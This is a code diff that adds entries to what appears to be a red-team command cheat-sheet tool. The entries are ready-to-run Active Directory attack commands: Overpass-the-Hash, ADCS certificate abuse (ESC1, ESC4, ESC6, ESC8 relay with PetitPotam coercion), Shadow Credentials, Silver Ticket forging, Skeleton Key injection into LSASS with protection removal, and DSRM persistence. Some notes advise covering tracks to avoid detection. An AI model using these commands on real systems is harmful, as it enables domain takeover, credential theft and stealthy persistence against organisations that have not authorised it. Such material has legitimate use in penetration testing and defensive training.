@@ -831,7 +831,10 @@ const TACTICS = [
             name: "Pass-the-Ticket & Spray",
             commands: [
             { id: "adlm6", label: "psexec (Pass-the-Ticket)", os: "Linux", command: "export KRB5CCNAME=$$TICKET && impacket-psexec -k -no-pass $$DOMAIN/$$USER@$$TARGET_HOST.$$DOMAIN", notes: "Use FQDN not IP — Kerberos requires hostname resolution." },
-            { id: "adlm7", label: "Spray hash across subnet", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -H $$HASH --continue-on-success", notes: "Find every host where this hash grants local admin — map full reach before moving." }
+            { id: "adlm7", label: "Spray hash across subnet", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -H $$HASH --continue-on-success", notes: "Find every host where this hash grants local admin — map full reach before moving." },
+            { id: "adlm-oph1", label: "Overpass-the-Hash — get TGT (Rubeus)", os: "Windows", command: "Rubeus.exe asktgt /user:$$USER /rc4:$$HASH /ptt", notes: "Converts NTLM hash into a Kerberos TGT. /ptt injects directly into current session. Use /aes256 if available." },
+            { id: "adlm-oph2", label: "Overpass-the-Hash — get TGT (impacket)", os: "Linux", command: "impacket-getTGT $$DOMAIN/$$USER -hashes :$$HASH && export KRB5CCNAME=$$USER.ccache", notes: "Linux equivalent. Gets a TGT from the KDC using NTLM hash. Then use with -k -no-pass tools." },
+            { id: "adlm-oph3", label: "Overpass-the-Hash — Mimikatz", os: "Windows", command: "mimikatz # sekurlsa::pth /user:$$USER /domain:$$DOMAIN /ntlm:$$HASH /run:powershell.exe", notes: "Spawns new process with Kerberos identity using hash. Less noisy than PTH for SMB signing environments." }
             ]
           },
           {
@@ -879,11 +882,57 @@ const TACTICS = [
         name: 'ADCS Attacks',
         description: 'Certificate abuse via Certipy (ESC1-ESC16) and Shadow Credentials. Forge certificates as any domain user — often the fastest path to Domain Admin.',
         tags: ['active-directory', 'adcs', 'kerberos'],
-        commands: [
-          { id: 'adad1', label: 'Find vulnerable ADCS templates', os: 'Linux', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -vulnerable -stdout', notes: 'Lists CA name and vulnerable templates with ESC classification. Save $$CA_NAME and $$ADCS_TEMPLATE.' },
-          { id: 'adad2', label: 'Request cert as DA (ESC1)', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template $$ADCS_TEMPLATE -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'ESC1: template allows SAN in CSR — forge a cert as any user including Domain Admin.' },
-          { id: 'adad3', label: 'Authenticate with cert → NT hash', os: 'Linux', command: 'certipy auth -pfx administrator.pfx -dc-ip $$DC', notes: 'PKINIT auth with the forged cert. Returns NT hash + TGT of the impersonated account.' },
-          { id: 'adad4', label: 'Shadow Credentials (GenericWrite)', os: 'Linux', command: 'certipy shadow auto -u $$USER@$$DOMAIN -p $$PASSWORD -account $$TARGET_HOST -dc-ip $$DC', notes: 'GenericWrite on computer/user → write msDS-KeyCredentialLink → PKINIT → NT hash. No cert template needed.' },
+        subtechniques: [
+          {
+            id: 'adcs-enum',
+            name: 'Enumeration',
+            commands: [
+              { id: 'adad1', label: 'Find vulnerable ADCS templates', os: 'Linux', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -vulnerable -stdout', notes: 'Lists CA name and vulnerable templates with ESC classification. Save $$CA_NAME and $$ADCS_TEMPLATE from output.' },
+              { id: 'adad-e2', label: 'Find CAs and templates (Windows)', os: 'Windows', command: 'certutil -CA', notes: 'List all CAs. Also: Certify.exe find /vulnerable lists vulnerable templates.' },
+            ],
+          },
+          {
+            id: 'adcs-esc1',
+            name: 'ESC1 — SAN in CSR',
+            commands: [
+              { id: 'adad2', label: 'Request cert as DA (ESC1)', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template $$ADCS_TEMPLATE -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'ESC1: template allows Subject Alternative Name (SAN) in CSR. Forge cert as any user including Domain Admin.' },
+              { id: 'adad3', label: 'Authenticate with cert → NT hash', os: 'Linux', command: 'certipy auth -pfx administrator.pfx -dc-ip $$DC', notes: 'PKINIT auth with the forged cert. Returns NT hash + TGT of the impersonated account.' },
+            ],
+          },
+          {
+            id: 'adcs-esc4',
+            name: 'ESC4 — Write Template Permissions',
+            commands: [
+              { id: 'adad-e4a', label: 'Overwrite template to enable SAN (ESC4)', os: 'Linux', command: 'certipy template -u $$USER@$$DOMAIN -p $$PASSWORD -template $$ADCS_TEMPLATE -save-old -dc-ip $$DC', notes: 'ESC4: WriteOwner/WriteDACL/WriteProperty on template. Overwrites template settings to enable SAN (ESC1 condition).' },
+              { id: 'adad-e4b', label: 'Request cert via now-vulnerable template', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template $$ADCS_TEMPLATE -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'After ESC4 modification the template is now ESC1-vulnerable. Request a DA cert as normal.' },
+              { id: 'adad-e4c', label: 'Restore original template (cleanup)', os: 'Linux', command: 'certipy template -u $$USER@$$DOMAIN -p $$PASSWORD -template $$ADCS_TEMPLATE -configuration $$ADCS_TEMPLATE.json -dc-ip $$DC', notes: 'Restore the saved original config to avoid detection.' },
+            ],
+          },
+          {
+            id: 'adcs-esc6',
+            name: 'ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2',
+            commands: [
+              { id: 'adad-e6a', label: 'Check CA flag (ESC6)', os: 'Linux', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -vulnerable -stdout | grep -i EDITF', notes: 'ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set — ANY template allows SAN in CSR, not just ESC1 templates.' },
+              { id: 'adad-e6b', label: 'Request cert with SAN (any template)', os: 'Linux', command: 'certipy req -u $$USER@$$DOMAIN -p $$PASSWORD -ca $$CA_NAME -template User -upn administrator@$$DOMAIN -dc-ip $$DC', notes: 'With ESC6, the standard User template (or any enroll-allowed template) becomes ESC1-equivalent.' },
+            ],
+          },
+          {
+            id: 'adcs-esc8',
+            name: 'ESC8 — NTLM Relay to AD CS HTTP',
+            commands: [
+              { id: 'adad-e8a', label: 'Check for AD CS HTTP endpoint', os: 'Linux', command: 'curl -k http://$$DC/certsrv/', notes: 'ESC8: CA web enrollment (certsrv) accessible over HTTP with NTLM auth — relayable.' },
+              { id: 'adad-e8b', label: 'Relay NTLM to AD CS (ESC8)', os: 'Linux', command: 'certipy relay -ca $$CA_NAME -template DomainController -dc $$DC', notes: 'Relay DC machine account auth (triggered via printerbug/petitpotam) to AD CS to get a DC certificate → DCSync.' },
+              { id: 'adad-e8c', label: 'Trigger DC authentication (PetitPotam)', os: 'Linux', command: 'python3 PetitPotam.py -u $$USER -p $$PASSWORD $$LHOST $$DC', notes: 'Coerces DC to authenticate to your machine. Combine with relay to AD CS endpoint for domain takeover.' },
+            ],
+          },
+          {
+            id: 'adcs-shadow',
+            name: 'Shadow Credentials',
+            commands: [
+              { id: 'adad4', label: 'Shadow Credentials (GenericWrite)', os: 'Linux', command: 'certipy shadow auto -u $$USER@$$DOMAIN -p $$PASSWORD -account $$TARGET_HOST -dc-ip $$DC', notes: 'GenericWrite on computer/user → write msDS-KeyCredentialLink → PKINIT → NT hash. No cert template needed.' },
+              { id: 'adad-sc2', label: 'Shadow Credentials (Whisker)', os: 'Windows', command: 'Whisker.exe add /target:$$TARGET_HOST', notes: 'Windows version: adds a key credential to target. Run Rubeus.exe asktgt after to get TGT.' },
+            ],
+          },
         ],
       },
       {
@@ -908,6 +957,16 @@ const TACTICS = [
             { id: "adct4", label: "Dump child krbtgt hash", os: "Linux", command: "impacket-secretsdump $$CHILD_DOMAIN/$$USER:$$PASSWORD@$$DC -just-dc-user krbtgt", notes: "Requires DA in child domain. The child krbtgt hash unlocks the parent forest." },
             { id: "adct5", label: "Child→Parent Golden Ticket", os: "Linux", command: "impacket-ticketer -nthash $$HASH -domain-sid $$CHILD_SID -extra-sid $$SID-519 -domain $$CHILD_DOMAIN Administrator", notes: "SID -519 = Enterprise Admins in parent. -extra-sid injects the parent EA SID into the forged ticket." },
             { id: "adct6", label: "Use inter-realm ticket", os: "Linux", command: "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass $$DOMAIN/Administrator@$$DC.$$DOMAIN", notes: "Use FQDN not IP. Re-enter the loop in the parent domain from Enterprise Admin position." }
+            ]
+          },
+          {
+            id: "adct-fgm",
+            name: "Foreign Group Membership",
+            commands: [
+            { id: "adct7", label: "Find foreign group members (BloodHound)", os: "Any", command: "MATCH (u:User)-[:MemberOf]->(g:Group) WHERE u.domain <> g.domain RETURN u.name, g.name, g.domain", notes: "BloodHound raw Cypher. Finds users from one domain that are members of groups in a different domain." },
+            { id: "adct8", label: "Find foreign members (PowerView)", os: "Windows", command: "Get-DomainForeignGroupMember -Domain $$DOMAIN", notes: "Enumerates group members from other domains. Foreign admins are a direct cross-trust privilege path." },
+            { id: "adct9", label: "Find foreign admins", os: "Windows", command: "Get-DomainForeignUser -Domain $$DOMAIN", notes: "Lists users from the current domain who are in groups in a foreign domain — high value for lateral movement." },
+            { id: "adct10", label: "Enumerate with LDAP", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --groups", notes: "Look for group members with SIDs from a different domain (SID prefix won't match current domain SID)." }
             ]
           }
         ],
@@ -934,6 +993,35 @@ const TACTICS = [
             commands: [
             { id: "addc5", label: "Forge Golden Ticket", os: "Linux", command: "impacket-ticketer -nthash $$HASH -domain-sid $$SID -domain $$DOMAIN Administrator", notes: "Forge a TGT as Administrator using krbtgt hash. Valid 10 years — survives all resets except krbtgt rotation." },
             { id: "addc6", label: "Use Golden Ticket", os: "Linux", command: "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass $$DOMAIN/Administrator@$$DC.$$DOMAIN", notes: "Use FQDN not IP. Rotate krbtgt twice to invalidate — most orgs never do this." }
+            ]
+          },
+          {
+            id: "addc-silver",
+            name: "Silver Ticket",
+            commands: [
+            { id: "addc9",  label: "Forge Silver Ticket (Linux)", os: "Linux", command: "impacket-ticketer -nthash $$HASH -domain-sid $$SID -domain $$DOMAIN -spn cifs/$$DC.$$DOMAIN Administrator", notes: "Forges a TGS using the target service account hash. No DC contact — works offline. -spn sets target service (cifs/http/mssql/host)." },
+            { id: "addc10", label: "Forge Silver Ticket (Mimikatz)", os: "Windows", command: "mimikatz # kerberos::golden /user:Administrator /domain:$$DOMAIN /sid:$$SID /target:$$DC.$$DOMAIN /service:cifs /rc4:$$HASH /ptt", notes: "kerberos::golden with /service makes a Silver Ticket. /ptt injects directly into memory." },
+            { id: "addc11", label: "Use Silver Ticket", os: "Linux", command: "export KRB5CCNAME=Administrator.ccache && impacket-smbclient -k -no-pass $$DOMAIN/Administrator@$$DC.$$DOMAIN", notes: "Silver Ticket is per-service — change -spn and SPN in smbclient/psexec as needed. No krbtgt contact means no DC log." },
+            ]
+          },
+          {
+            id: "addc-skel",
+            name: "Skeleton Key",
+            commands: [
+            { id: "addc12", label: "Inject skeleton key (Mimikatz)", os: "Windows", command: "mimikatz # privilege::debug\nmimikatz # misc::skeleton", notes: "Patches LSASS on the DC. Every account now also accepts 'mimikatz' as password. Requires DA on DC. Does not survive DC reboot." },
+            { id: "addc13", label: "Remote skeleton key injection", os: "Windows", command: "Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName $$DC", notes: "Remote injection via PowerShell Remoting. DC must allow PS Remoting." },
+            { id: "addc14", label: "Bypass LSASS protection first", os: "Windows", command: "mimikatz # privilege::debug\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton", notes: "If RunAsPPL is enabled — use the mimidrv.sys driver (!) to remove protection before injection." },
+            { id: "addc15", label: "Authenticate with skeleton password", os: "Any", command: "net use \\\\$$DC\\admin$ /user:$$DOMAIN\\Administrator mimikatz", notes: "Any domain account now also accepts 'mimikatz' as password while skeleton is active." },
+            ]
+          },
+          {
+            id: "addc-dsrm",
+            name: "DSRM Abuse",
+            commands: [
+            { id: "addc16", label: "Dump DSRM hash", os: "Windows", command: "mimikatz # token::elevate\nmimikatz # lsadump::sam", notes: "Dumps local SAM on the DC — contains the DSRM Administrator hash. Requires SYSTEM on DC." },
+            { id: "addc17", label: "Enable DSRM remote logon", os: "Windows", command: "New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD", notes: "Value 2 = DSRM account can log on like a normal local account even when DC is online. Persist this for reuse." },
+            { id: "addc18", label: "Pass-the-Hash with DSRM", os: "Windows", command: "mimikatz # sekurlsa::pth /domain:$$DC /user:Administrator /ntlm:$$HASH /run:powershell.exe", notes: "Use DC hostname (not domain) as /domain. DSRM is a LOCAL account — domain must be the machine name." },
+            { id: "addc19", label: "Verify registry setting", os: "Windows", command: "Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior", notes: "" },
             ]
           },
           {
